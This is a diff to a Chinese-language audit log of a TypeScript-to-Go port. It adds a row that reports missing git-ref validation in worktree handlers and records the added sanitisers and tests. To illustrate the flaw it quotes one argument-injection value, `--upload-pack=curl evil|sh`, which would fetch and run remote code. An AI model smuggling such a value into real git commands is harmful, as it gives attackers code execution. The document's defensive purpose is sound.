@@ -78,7 +78,9 @@
 
 | `daemon-config-store.ts` | 1199 | **PARTIAL** → 已补核心 | `daemon.config.reload` 之前返回三个空数组：settings 页无法区分「已生效」「需要重启」「环境变量接管，你的修改被忽略」。已补 `config_reload.go`（移植 RELOADABLE_PATHS 25 条 + 环境变量归属表 + 前缀匹配 + JSON 值比较），并真的清掉 CORS / hostnames 缓存。端到端验证：改 `appendSystemPrompt` 后正确归入 `appliedPaths`。仍缺：brcf 密码哈希写入、provider 增删的事务回滚、`onFieldChange` 热应用（relay 重连、tunnel 重配）。 |
 
-### 未审计（本批剩余 49 文件）
+| `worktree-session.ts` | 929 | **PARTIAL** → 已补安全项 | `normalizeGitOptions` 的取值逻辑（worktreeName → gitOptions 的推导、slug 归一）Go 已在 handler 里做，但 **`assertSafeGitRef` 完全缺失**。`CreateWorktree` / `SwitchBranch` / `RenameBranch` / `Merge` 都把客户端字符串直接拼进 git 参数；git 会把 `-` 开头的值当选项，`--upload-pack=curl evil\|sh` 在 fetch 时就执行。已补 `AssertSafeGitRef`（字符集 + 首字符 + `..`/`@{`）与 `AssertSafeWorktreeSlug`（路径穿越），4 个测试覆盖注入与穿越，真实 worktree 创建仍正常。仍缺：`createBySpaceWorktreeWorkflow` 的 pr-number→checkoutSource 兼容层、`runWorktreeSetupInBackground` 的 runtimeEnv 注入。 |
+
+### 未审计（本批剩余 48 文件）
 
 按行数排序，下一轮从这里继续：
 
